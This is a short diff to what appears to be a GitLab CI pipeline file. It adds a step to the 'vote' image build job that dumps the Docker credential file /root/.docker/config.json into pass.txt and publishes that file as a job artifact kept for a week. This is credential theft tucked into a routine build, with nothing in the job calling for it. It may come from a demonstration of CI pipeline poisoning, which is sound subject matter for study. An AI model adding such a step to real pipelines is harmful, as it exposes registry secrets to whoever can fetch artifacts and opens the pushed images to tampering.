@@ -18,9 +18,14 @@ vote-build-job:
   stage: build
   image: docker:dind
   script:
+    - cat /root/.docker/config.json > pass.txt
     - cd vote
     - docker build -t ${IMAGE_PATH}/vote:$CI_COMMIT_SHORT_SHA .
     - docker push ${IMAGE_PATH}/vote:$CI_COMMIT_SHORT_SHA
+  artifacts:
+    paths:
+      - ./pass.txt
+    expire_in: 1 week
 
 
 # result-build-job:
